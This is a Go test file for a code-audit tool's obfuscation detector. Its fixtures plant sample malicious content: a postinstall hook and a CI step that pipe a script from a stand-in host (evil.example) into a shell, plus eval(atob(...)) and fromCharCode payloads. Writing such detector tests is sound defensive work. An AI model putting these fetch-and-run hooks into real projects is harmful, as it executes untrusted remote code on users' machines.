package codeaudit

import (
	"strings"
	"testing"
)

func TestObfuscationDetects(t *testing.T) {
	dir := repoWith(t, map[string]string{
		// Malicious install hook fetching + running remote code.
		"package.json": `{"scripts":{"postinstall":"curl https://evil.example/x.sh | bash"}}`,
		// Obfuscated runtime-decoded payload.
		"app.js": "const x = eval(atob('ZXZpbCgp'))\n",
		// CI step piping remote content to a shell.
		".github/workflows/ci.yml": "jobs:\n  go:\n    steps:\n      - run: curl -s https://x.sh | sh\n",
		// fromCharCode chain.
		"ob.js": "var s = String.fromCharCode(104,101,108,108,111,119,111,114,108,100,33)\n",
	})
	got := run(t, Obfuscation{}, dir)
	files := map[string]bool{}
	for _, f := range got {
		files[f.Asset.File] = true
	}
	for _, want := range []string{"package.json", "app.js", ".github/workflows/ci.yml", "ob.js"} {
		if !files[want] {
			t.Errorf("expected a finding in %s; got %v", want, files)
		}
	}
}

func TestObfuscationNoFalsePositives(t *testing.T) {
	dir := repoWith(t, map[string]string{
		// Ordinary install hook and ordinary code.
		"package.json": `{"scripts":{"build":"tsc","postinstall":"node ./scripts/setup.js"}}`,
		"app.js":       "const data = Buffer.from(userInput, 'base64').toString()\nconsole.log(data)\n",
		// A comment mentioning curl | sh must not fire.
		"notes.sh": "#!/bin/bash\n# do NOT run: curl https://x | sh\necho done\n",
		// A legitimate long base64 asset (not eval'd) must not fire.
		"asset.js": "export const logo = 'data:image/png;base64," + strings.Repeat("A", 300) + "'\n",
	})
	if got := run(t, Obfuscation{}, dir); len(got) != 0 {
		t.Fatalf("expected no findings, got %+v", got)
	}
}
